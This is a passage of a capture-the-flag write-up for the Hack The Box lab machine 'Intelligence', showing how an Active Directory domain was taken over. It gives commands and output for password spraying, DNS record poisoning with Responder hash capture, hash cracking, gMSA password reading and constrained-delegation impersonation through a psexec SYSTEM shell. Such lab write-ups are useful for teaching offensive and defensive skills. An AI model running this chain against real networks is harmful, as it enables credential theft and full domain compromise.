+200      GET      145l      431w    21013c http://intelligence.htb/documents/2020-09-11-upload.pdf
+200      GET      192l      750w    47233c http://intelligence.htb/documents/2020-09-05-upload.pdf
+200      GET      193l      754w    48233c http://intelligence.htb/documents/2020-09-04-upload.pdf
+200      GET      188l      731w    45224c http://intelligence.htb/documents/2020-08-03-upload.pdf
+200      GET      211l      753w    47532c http://intelligence.htb/documents/2020-09-13-upload.pdf
+200      GET      126l      404w    19453c http://intelligence.htb/documents/2020-10-05-upload.pdf
+200      GET      192l      768w    45475c http://intelligence.htb/documents/2020-09-06-upload.pdf
+200      GET      226l      801w    47900c http://intelligence.htb/documents/2020-09-27-upload.pdf
+200      GET      220l      730w    43483c http://intelligence.htb/documents/2020-09-29-upload.pdf
+200      GET      196l      762w    46496c http://intelligence.htb/documents/2020-09-30-upload.pdf
+200      GET      185l      753w    47228c http://intelligence.htb/documents/2020-11-01-upload.pdf
+200      GET      185l      741w    45550c http://intelligence.htb/documents/2020-11-03-upload.pdf
+200      GET      219l      785w    46199c http://intelligence.htb/documents/2020-11-06-upload.pdf
+200      GET      205l      804w    47007c http://intelligence.htb/documents/2020-11-11-upload.pdf
+200      GET      215l      762w    45192c http://intelligence.htb/documents/2020-11-10-upload.pdf
+200      GET      133l      382w    19162c http://intelligence.htb/documents/2020-11-13-upload.pdf
+200      GET      206l      786w    47908c http://intelligence.htb/documents/2020-09-16-upload.pdf
+200      GET      193l      757w    44407c http://intelligence.htb/documents/2020-09-22-upload.pdf
+200      GET      212l      818w    48590c http://intelligence.htb/documents/2020-10-19-upload.pdf
+200      GET      206l      798w    48840c http://intelligence.htb/documents/2020-11-30-upload.pdf
+200      GET      136l      422w    20510c http://intelligence.htb/documents/2020-12-20-upload.pdf
+200      GET      199l      789w    47669c http://intelligence.htb/documents/2020-12-10-upload.pdf
+200      GET      209l      800w    48542c http://intelligence.htb/documents/2020-12-15-upload.pdf
+200      GET      208l      814w    47604c http://intelligence.htb/documents/2020-12-24-upload.pdf
+200      GET      126l      403w    19738c http://intelligence.htb/documents/2020-12-28-upload.pdf
+200      GET      190l      690w    44700c http://intelligence.htb/documents/2020-12-30-upload.pdf
+200      GET      132l      417w    19592c http://intelligence.htb/documents/2020-11-24-upload.pdf
+200      GET      214l      792w    49102c http://intelligence.htb/documents/2021-01-25-upload.pdf
+200      GET      136l      417w    19382c http://intelligence.htb/documents/2021-01-14-upload.pdf
+200      GET      134l      438w    19450c http://intelligence.htb/documents/2021-03-01-upload.pdf
+200      GET      138l      413w    18416c http://intelligence.htb/documents/2021-03-07-upload.pdf
+200      GET      204l      786w    48078c http://intelligence.htb/documents/2021-02-10-upload.pdf
+200      GET      205l      793w    49650c http://intelligence.htb/documents/2021-01-03-upload.pdf
+200      GET      140l      432w    20951c http://intelligence.htb/documents/2021-03-27-upload.pdf
+200      GET      193l      715w    46040c http://intelligence.htb/documents/2021-01-30-upload.pdf
+200      GET      210l      794w    48674c http://intelligence.htb/documents/2021-03-25-upload.pdf
+200      GET      211l      777w    48119c http://intelligence.htb/documents/2021-02-13-upload.pdf
+200      GET      198l      793w    44476c http://intelligence.htb/documents/2021-03-10-upload.pdf
+200      GET      202l      772w    50101c http://intelligence.htb/documents/2021-03-18-upload.pdf
+200      GET      204l      765w    47564c http://intelligence.htb/documents/2021-03-21-upload.pdf</code></pre><p><img src="images/intelligence/pasted-image-20260414161630.webp" alt="Screenshot" loading="lazy" /></p><p>Found a password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">NewIntelligenceCorpUser9876</code></pre><p>Ill spray this against some of the users found in the metadata of the PDFs</p><h2>User compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.intelligence.htb -u users.txt -p &#39;NewIntelligenceCorpUser9876&#39; --continue-on-success
+
+SMB         10.129.95.154    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876</code></pre><p>User compromise</p><h3>Access on shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.intelligence.htb -u tiffany.molina -p &#39;NewIntelligenceCorpUser9876&#39; --shares             
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\tiffany.molina:NewIntelligenceCorpUser9876 
+SMB         10.129.95.154   445    DC               [*] Enumerated shares
+SMB         10.129.95.154   445    DC               Share           Permissions     Remark
+SMB         10.129.95.154   445    DC               -----           -----------     ------
+SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.95.154   445    DC               C$                              Default share
+SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.95.154   445    DC               IT              READ            
+SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.95.154   445    DC               Users           READ</code></pre><p>Read access on quite a few shares</p><p>There are no group policy passwords</p><h3>Dumping all the users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.intelligence.htb -u tiffany.molina -p &#39;NewIntelligenceCorpUser9876&#39; --users-export users.txt
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\tiffany.molina:NewIntelligenceCorpUser9876 
+SMB         10.129.95.154   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.95.154   445    DC               Administrator                 2021-04-19 00:18:37 0       Built-in account for administering the computer/domain 
+SMB         10.129.95.154   445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.95.154   445    DC               krbtgt                        2021-04-19 00:42:42 0       Key Distribution Center Service Account 
+SMB         10.129.95.154   445    DC               Danny.Matthews                2021-04-19 00:49:34 0        
+SMB         10.129.95.154   445    DC               Jose.Williams                 2021-04-19 00:49:35 0        
+SMB         10.129.95.154   445    DC               Jason.Wright                  2021-04-19 00:49:36 0        
+SMB         10.129.95.154   445    DC               Samuel.Richardson             2021-04-19 00:49:37 0        
+SMB         10.129.95.154   445    DC               David.Mcbride                 2021-04-19 00:49:37 0        
+SMB         10.129.95.154   445    DC               Scott.Scott                   2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               David.Reed                    2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Ian.Duncan                    2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Michelle.Kent                 2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Jennifer.Thomas               2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Kaitlyn.Zimmerman             2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Travis.Evans                  2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Kelly.Long                    2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Nicole.Brock                  2021-04-19 00:49:38 0        
+SMB         10.129.95.154   445    DC               Stephanie.Young               2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               John.Coleman                  2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Thomas.Valenzuela             2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Thomas.Hall                   2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Brian.Baker                   2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Richard.Williams              2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Teresa.Williamson             2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               David.Wilson                  2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               Darryl.Harris                 2021-04-19 00:49:39 0        
+SMB         10.129.95.154   445    DC               William.Lee                   2021-04-19 00:49:40 0        
+SMB         10.129.95.154   445    DC               Thomas.Wise                   2021-04-19 00:49:40 0        
+SMB         10.129.95.154   445    DC               Veronica.Patel                2021-04-19 00:49:40 0        
+SMB         10.129.95.154   445    DC               Joel.Crawford                 2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jean.Walter                   2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Anita.Roberts                 2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Brian.Morris                  2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Daniel.Shelton                2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jessica.Moody                 2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Tiffany.Molina                2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               James.Curbow                  2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jeremy.Mora                   2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Jason.Patterson               2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Laura.Lee                     2021-04-19 00:49:41 0        
+SMB         10.129.95.154   445    DC               Ted.Graves                    2021-04-19 00:49:42 0        
+SMB         10.129.95.154   445    DC               [*] Enumerated 41 local users: intelligence
+SMB         10.129.95.154   445    DC               [*] Writing 41 local users to users.txt</code></pre><p>Dumped all the users</p><h2>IT share</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //dc.intelligence.htb/IT -U &#39;tiffany.molina&#39;%&#39;NewIntelligenceCorpUser9876&#39;                              
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Mon Apr 19 01:50:55 2021
+  ..                                  D        0  Mon Apr 19 01:50:55 2021
+  downdetector.ps1                    A     1046  Mon Apr 19 01:50:55 2021
+
+		3770367 blocks of size 4096. 1451522 blocks available
+smb: \&gt; get downdetector.ps1 
+getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (17.9 KiloBytes/sec) (average 17.9 KiloBytes/sec)
+smb: \&gt; </code></pre><p>Found a powershell script</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat downdetector.ps1                                     
+��# Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Where-Object Name -like &quot;web*&quot;)  {
+try {
+$request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentials
+if(.StatusCode -ne 200) {
+Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;
+}
+} catch {}
+}</code></pre><p>User <code>ted.gaves</code></p><p>Based off this script i think i should be able to add a DNS entry to make it point to my server then since it runs every 5 minutes i can retrieve a NetNTLMv2 hash</p><h2>Compromising <code>ted.graves</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 dnstool.py -u &#39;intelligence.htb\Tiffany.Molina&#39; -p &#39;NewIntelligenceCorpUser9876&#39; --action add --record web-dmuhackers --data 10.10.14.90 --type A 10.129.95.154      
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully</code></pre><p>Ill start by adding a DNS record</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>Then ill start responder and wait!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[HTTP] NTLMv2 Client   : 10.129.95.154
+[HTTP] NTLMv2 Username : intelligence\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:3e63f5e5b718cc63:3157DB32021A5C1DAD0E4DD8CE22A75C:010100000000000080706BA564CCDC0179EB9442D63000DC00000000020008004C0034003700540001001E00570049004E002D0033005600320035003000410030004200440032003100040014004C003400370054002E004C004F00430041004C0003003400570049004E002D00330056003200350030004100300042004400320031002E004C003400370054002E004C004F00430041004C00050014004C003400370054002E004C004F00430041004C000800300030000000000000000000000000200000459CD328F3A4DEFBAD71DE288EECA7DA745C307F728320B9AA14B67126CADFF40A001000000000000000000000000000000000000900480048005400540050002F007700650062002D0064006D0075006800610063006B006500720073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</code></pre><p>I now have the hash of <code>ted.graves</code></p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat ted-graves.hash /usr/share/wordlists/rockyou.txt
+
+TED.GRAVES::intelligence:3e63f5e5b718cc63:3157db32021a5c1dad0e4dd8ce22a75c:010100000000000080706ba564ccdc0179eb9442d63000dc00000000020008004c0034003700540001001e00570049004e002d0033005600320035003000410030004200440032003100040014004c003400370054002e004c004f00430041004c0003003400570049004e002d00330056003200350030004100300042004400320031002e004c003400370054002e004c004f00430041004c00050014004c003400370054002e004c004f00430041004c000800300030000000000000000000000000200000459cd328f3a4defbad71de288eeca7da745c307f728320b9aa14b67126cadff40a001000000000000000000000000000000000000900480048005400540050002f007700650062002d0064006d0075006800610063006b006500720073002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy</code></pre><p>Ive cracked the hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ted.graves:Mr.Teddy</code></pre><p>Ill validate these credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.intelligence.htb -u &#39;ted.graves&#39; -p &#39;Mr.Teddy&#39;       
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\ted.graves:Mr.Teddy</code></pre><p>This user is compromised</p><h2>Bloodhound</h2><p><img src="images/intelligence/pasted-image-20260414171941.webp" alt="Screenshot" loading="lazy" /></p><p>This user has ReadGMSAPassword on <code>svc_int$</code></p><h2>Compromising <code>svc_int$</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc.intelligence.htb -u &#39;ted.graves&#39; -p &#39;Mr.Teddy&#39; --gmsa
+LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.95.154   389    DC               [+] intelligence.htb\ted.graves:Mr.Teddy 
+LDAP        10.129.95.154   389    DC               [*] Getting GMSA Passwords
+LDAP        10.129.95.154   389    DC               Account: svc_int$             NTLM: 3c356107d6b589fdfc215e2c3de484b5     PrincipalsAllowedToReadPassword: [&#39;DC$&#39;, &#39;itsupport&#39;]</code></pre><p>I now have the users NTLM hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.intelligence.htb -u &#39;svc_int$&#39; -H &#39;3c356107d6b589fdfc215e2c3de484b5&#39;                                               
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\svc_int$:3c356107d6b589fdfc215e2c3de484b5</code></pre><p>This user is compromised</p><h3>Bloodhound on <code>svc_int$</code></h3><p><img src="images/intelligence/pasted-image-20260414172248.webp" alt="Screenshot" loading="lazy" /></p><h2>Domain admin via constrained delegation</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h impacket-getST intelligence.htb/svc_int$ -hashes &#39;:3c356107d6b589fdfc215e2c3de484b5&#39; -spn &#39;WWW/dc.intelligence.htb&#39; -impersonate Administrator
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache</code></pre><p>I now have a ticket for the administrator</p><p>Both winrm and RDP are shut in this instance so ill have to use wmiexec or psexec</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h impacket-psexec -k -no-pass dc.intelligence.htb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.intelligence.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file vmcQqBUK.exe
+[*] Opening SVCManager on dc.intelligence.htb.....
+[*] Creating service xZWI on dc.intelligence.htb.....
+[*] Starting service xZWI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+C:\Windows\system32&gt; </code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-resolute/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Resolute</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-cascade/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Cascade</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
